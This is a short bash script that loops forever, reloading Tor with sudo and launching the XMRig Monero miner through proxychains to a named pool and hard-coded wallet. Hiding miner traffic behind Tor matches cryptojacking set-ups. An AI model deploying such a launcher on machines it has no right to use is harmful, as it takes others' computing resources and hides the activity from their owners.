#!/bin/bash
while true
do
  echo hello
  sudo service tor reload
  proxychains ./xmrig --url pool.hashvault.pro:443 --user 46vGFwfNswJYk7Lko1C8yuMbL1yNjkeJMEMDHcmj1YecJqho18vqKHdECaNzYkXdZDNH6oJogukn625cL6AEDsDN8iiEw4b --pass x --keepalive --donate-level 1 --tls
done
